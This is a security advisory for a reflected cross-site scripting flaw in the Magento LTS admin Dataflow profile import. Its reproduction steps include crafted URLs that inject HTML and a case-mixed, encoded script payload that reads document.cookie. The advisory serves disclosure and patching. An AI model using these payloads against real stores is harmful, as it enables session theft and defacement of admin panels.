# [M] Magento LTS: Reflected XSS - Import -> Data Flow (profiles) 

## Summary
Severity: Medium
Advisory: GHSA-x8jv-q8j2-487c
CVE: CVE-2026-42458
CWE: CWE-87
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-x8jv-q8j2-487c
Type: github-advisory

## Affected
- Packagist: `openmage/magento-lts` — affected >=0 <20.18.0

## Details
A reflected XSS vulnerability was found under admin panel ->  System -> Import/Export -> Dataflow -  Profiles.

## Steps to produce

+ Login to  the admin panel 

+ Go to the path   `System -> Import/Export -> Dataflow -  Profiles`

+ Select profile direction as `Import`.

+ Click on `Import Customers` 

+ Upload the file.

File Link: [customer_20260212_204335.csv](https://github.com/user-attachments/files/25629638/customer_20260212_204335.csv)

+ Go back to `Run profile`.

+ Select the uploaded file and Click on `Run in Popup`.

+ One can see a URL like this 

```
https://demo-admin.openmage.org/index.php/admin/system_convert_gui/run/id/6/key/40dbbb2e93f45f0463c57ff733352f4f/files/import-20260215151125-1_customer_20260212_204335.csv/
```


+ One can see the filename getting reflection in HTML tags.

+ Inject an HTML tag and observe.

```
https://demo-admin.openmage.org/index.php/admin/system_convert_gui/run/id/6/key/40dbbb2e93f45f0463c57ff733352f4f/files/"><h3>hacked</h3>/
``` 

<img width="1796" height="302" alt="image (3)" src="https://github.com/user-attachments/assets/502330b0-fa73-4b90-a81f-6216a98e474a" />

+ One can see the tag is getting executed.

+  Proceed for XSS.

```
https://demo-admin.openmage.org/index.php/admin/system_convert_gui/run/id/6/key/40dbbb2e93f45f0463c57ff733352f4f/files/%3CScRiPt%20%3Eprompt(document.cookie)%3C%2FScRiPt%3E
```

<img width="1670" height="562" alt="image (4)" src="https://github.com/user-attachments/assets/98a75081-fa8c-4483-9078-0ab5e7e14e4d" />


+ There is an XSS popup.

## Impact

Cookie stealing, JS deface, many more

## References
- https://github.com/OpenMage/magento-lts/security/advisories/GHSA-x8jv-q8j2-487c
- https://nvd.nist.gov/vuln/detail/CVE-2026-42458
- https://github.com/OpenMage/magento-lts
